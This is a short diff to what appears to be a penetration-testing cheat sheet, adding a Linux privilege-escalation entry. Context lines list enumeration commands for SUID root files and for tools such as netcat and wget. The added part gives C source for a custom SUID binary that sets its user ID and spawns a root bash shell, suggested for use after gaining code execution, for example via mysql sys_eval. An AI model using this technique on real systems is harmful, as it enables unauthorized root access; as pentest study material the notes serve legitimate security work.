@@ -168,6 +168,18 @@ Priv Esc - Linux
 - `find / -user root -perm -4000 -exec ls -ldb {} \;`
 - `which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null`
 (then ls -la, look for 777 file permissions).
+- Custom SUID binary. Requires code execution as the target user. Example: mysql sys_eval as root.
+```
+#include<stdio.h>
+#include<unistd.h>
+#include<sys/types.h>
+
+int main(){
+    setuid(geteuid());
+    system("/bin/bash");
+    return 0;
+}
+```
 
 Priv Esc - Windows
 ----------------
